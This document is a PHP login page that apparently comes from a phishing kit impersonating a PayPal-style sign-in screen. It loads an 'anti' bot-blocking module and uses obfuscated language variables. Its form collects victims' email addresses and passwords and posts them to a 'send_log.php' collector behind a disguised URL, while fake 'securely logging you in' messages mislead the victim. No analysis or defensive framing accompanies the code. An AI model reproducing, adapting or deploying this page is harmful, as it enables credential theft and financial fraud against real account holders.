<?php
   
   session_start();
   error_reporting(E_ERROR | E_PARSE);

   include('anti/anti.php');
   include('../hash.php');

   if(isset($_SESSION['lang_'])){
       include('langdir/'.$_SESSION['lang_']);
   }else {
       include('langdir/en.php');
   }
   
   ?>
<!DOCTYPE html>
<html lang="en" class="no-js desktop">
   <head>
      <meta charset="utf-8" />
      <title>(<?php echo $_SESSION['xcountryCodex']; ?>) <?php echo $xys9x; ?></title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
      <link rel="shortcut icon" href="asset/img/favicon/fav.ico" />
      <link rel="apple-touch-icon" href="asset/img/pp64.png" />
      <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
      <link rel="stylesheet" href="asset/css/log.css" />
   </head>
   <body class="desktop">
      <div id="main" class="main" role="main">
         <section id="login" class="login " data-role="page">
            <div class="corral">
               <div class="contentContainer activeContent">
                  <header>
                     <p class="xyslogoppx xyslogoppx-long"></p>
                  </header>
                  <div class="notifications hide">
                     <p class="notification notification-critical" role="alert"><?php echo $xys10x; ?></p>
                  </div>
                  <form action="send/send_log.php?customer.x=ID-PA$1$7i/<?php echo md5(time()).md5(time()); ?>" method="post" class="proceed maskable" autocomplete="off" novalidate>
                     <div id="emailSection" class="clearfix">
                        <div class="textInput" id="login_emaildiv">
                           <div class="fieldWrapper"> <label for="email" class="fieldLabel"><?php echo $xys11x; ?></label> <input id="xysemailx" name="xysemailx" type="email" class="hasHelp validateEmpty " required="required" value="" autocomplete="off" placeholder="<?php echo $xys11x; ?>" aria-describedby="emailErrorMessage" /></div>
                           <div class="errorMessage" id="emailErrorMessage">
                              <p class="emptyError hide"><?php echo $xys12x; ?></p>
                           </div>
                        </div>
                     </div>
                     <div id="passwordSection" class="clearfix">
                        <div class="textInput" id="login_passworddiv">
                           <div class="fieldWrapper"> <label for="password" class="fieldLabel"><?php echo $xys13x; ?></label> <input id="xyspassx" name="xyspassx" type="password" class="hasHelp validateEmpty pin-password" required="required" value="" placeholder="<?php echo $xys13x; ?>" aria-describedby="passwordErrorMessage" /> <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" aria-label="Show password"><?php echo $xys14x; ?></button> <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" aria-label="Hide"><?php echo $xys15x; ?></button></div>
                           <div class="errorMessage" id="passwordErrorMessage">
                              <p class="emptyError hide"><?php echo $xys16x; ?></p>
                           </div>
                        </div>
                     </div>
                     <div class="actions actionsSpacedShort"> <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="<?php echo $xys17x; ?>"><?php echo $xys17x; ?></button></div>
                      <input type="hidden" name="notifications" value="<?php echo $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>"> 
                  </form>
                  <div class="forgotLink"> <a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink"><?php echo $xys18x; ?></a></div>
                  <div id="signupContainer" class="signupContainer">
                     <div class="loginSignUpSeparator"> <span class="textInSeparator"><?php echo $xys19x; ?></span></div>
                     <a href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount"><?php echo $xys20x; ?></a>
                  </div>
               </div>
            </div>
         </section>
         <footer class="footer" role="contentinfo">
            <div class="legalFooter">
               <ul class="footerGroup">
                  <li> <a href="#"><?php echo $xys5x; ?></a></li>
                  <li> <a href="#"><?php echo $xys6x; ?></a></li>
                  <li> <a href="#"><?php echo $xys7x; ?></a></li>
                  <li> <a href="#"><?php echo $xys8x; ?></a></li>
               </ul>
            </div>
         </footer>
      </div>
      <div class="transitioning" style="display: none;">
         <p class="checkingInfo hide">Checking your info…</p>
         <p class="oneSecond hide">Just a second…</p>
         <p class="secureMessage hide">Securely logging you in...</p>
         <p class="oneTouchMessage hide"></p>
         <p class="retrieveInfo hide">Retrieving your info...</p>
         <p class="waitFewSecs hide">This may take a few seconds...</p>
      </div>
      <script src="asset/js/jquery.min.js"></script> <script src="asset/js/auth.js"></script> 
   </body>
</html>